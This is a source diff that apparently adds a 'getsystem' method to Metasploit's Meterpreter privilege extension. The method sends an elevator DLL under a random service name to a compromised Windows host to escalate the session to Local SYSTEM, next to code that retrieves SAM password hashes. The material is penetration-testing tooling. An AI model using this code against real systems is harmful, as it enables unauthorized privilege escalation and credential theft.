@@ -36,7 +36,46 @@ class Priv < Extension
 		# Initialize sub-classes
 		self.fs = Fs.new(client)
 	end
+	
+	#
+	# Attempt to elevate the meterpreter to Local SYSTEM
+	#
+	def getsystem( technique=0 )
+		request = Packet.create_request( 'priv_elevate_getsystem' )
+		
+		elevator_name = Rex::Text.rand_text_alpha_lower( 6 ) 
+		
+		if( client.platform == 'x64/win64' )
+			elevator_path = ::File.join( Msf::Config.install_root, "data", "meterpreter", "elevator.x64.dll" )
+		else
+			elevator_path = ::File.join( Msf::Config.install_root, "data", "meterpreter", "elevator.dll" )
+		end
+		
+		elevator_path = ::File.expand_path( elevator_path )
+		
+		elevator_data = ""
+		
+		::File.open( elevator_path, "rb" ) { |f|
+			elevator_data += f.read( f.stat.size )
+		}
 
+		request.add_tlv( TLV_TYPE_ELEVATE_TECHNIQUE, technique )
+		request.add_tlv( TLV_TYPE_ELEVATE_SERVICE_NAME, elevator_name )
+		request.add_tlv( TLV_TYPE_ELEVATE_SERVICE_DLL, elevator_data )
+		request.add_tlv( TLV_TYPE_ELEVATE_SERVICE_LENGTH, elevator_data.length )
+		
+		# as some service routines can be slow we bump up the timeout to 90 seconds
+		response = client.send_request( request, 90 )
+		
+		technique = response.get_tlv_value( TLV_TYPE_ELEVATE_TECHNIQUE )
+		
+		if( response.result == 0 and technique != nil )
+			return [ true, technique ]
+		end
+		
+		return [ false, 0 ]
+	end
+	
 	#
 	# Returns an array of SAM hashes from the remote machine.
 	#
